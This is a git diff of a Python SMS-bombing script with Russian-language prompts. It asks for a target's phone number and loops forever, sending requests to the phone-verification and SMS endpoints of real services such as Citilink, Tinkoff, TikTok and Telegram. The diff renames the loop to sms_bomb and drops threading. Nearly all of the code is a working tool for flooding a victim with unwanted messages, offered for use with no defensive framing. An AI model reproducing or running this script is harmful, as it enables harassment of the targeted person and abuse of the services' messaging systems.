@@ -1,6 +1,5 @@
 #-= It's just illusion =-#
 import requests, random, time, fake_useragent, sys
-from threading import Thread
 from termcolor import colored
 from update import *
 
@@ -41,9 +40,16 @@ def normalizephone(phone):
 
 def zapros():
     global _phone
-    global countT
     _phone = input('Ведите номер телефона>>: ')
-    countT = input('Enter threading>>: ')
+
+def randomchik():
+	global _name
+	global password
+	global username
+	for x in range(12):
+		_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+		password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+		username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
 
 internet_on()
 check_update(version)
@@ -63,21 +69,15 @@ zapros()
 
 phone = normalizephone(_phone)
 
-for x in range(12):
-	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-
-
 
 print("\nЧто бы отменить нажмите Ctrl + C")
-print('\n\n', colored('Т', 'grey'), colored('и', 'red'), colored('М', 'green'), colored('а', 'yellow'), ' ', colored('П', 'blue'), colored('и', 'magenta'), colored('Д', 'cyan'), colored('о', 'white'),  colored('Р', 'grey'), colored('а', 'red'),colored('С', 'green'))
+print('\n\n', colored('Т', 'white'), colored('и', 'red'), colored('М', 'green'), colored('а', 'yellow'), ' ', colored('П', 'blue'), colored('и', 'magenta'), colored('Д', 'cyan'), colored('о', 'white'),  colored('Р', 'blue'), colored('а', 'red'),colored('С', 'green'))
 
-def infinity():
+def sms_bomb():
 	count = 0
 	while True:
-		request_timeout = 0.00001
 		_phone = phone
+		randomchik()
 
 		try:
 			a = requests.post('https://www.citilink.ru/registration/confirm/phone/'+_phone+'/')
@@ -119,19 +119,19 @@ def infinity():
 			count += 1
 			print(colored('tinkoff отправлено!', 'green'), colored(count, 'magenta'))
 		except:
-			print(colored('tinkoff не отправлено!', 'red'))
+			print(colored('Tinkoff не отправлено!', 'red'))
 
 		try:
 			a = requests.post("https://m.tiktok.com/node-a/send/download_link",  json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":_phone[2:],"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, headers=headers1)
 			count += 1
-			print(colored('tiktok отправлено!', 'green'), colored(count, 'magenta'))
+			print(colored('Tiktok отправлено!', 'green'), colored(count, 'magenta'))
 		except:
 			print(colored('tiktok не отправлено!', 'red'))
 
 		try:
 			a = requests.post("https://my.telegram.org/auth/send_password", data={"phone": _phone}, headers=headers1)
 			count += 1
-			print(colored('telegram отправлено!', 'green'), colored(count, 'magenta'))
+			print(colored('Telegram отправлено!', 'green'), colored(count, 'magenta'))
 		except:
 			print(colored('telegram не отправлено!', 'red'))
 
@@ -145,5 +145,4 @@ def infinity():
 		print(colored('Список дошёл до конца', 'magenta'))
 		time.sleep(10)
 
-countT = Thread(target=infinity)
-countT.start()
+sms_bomb()
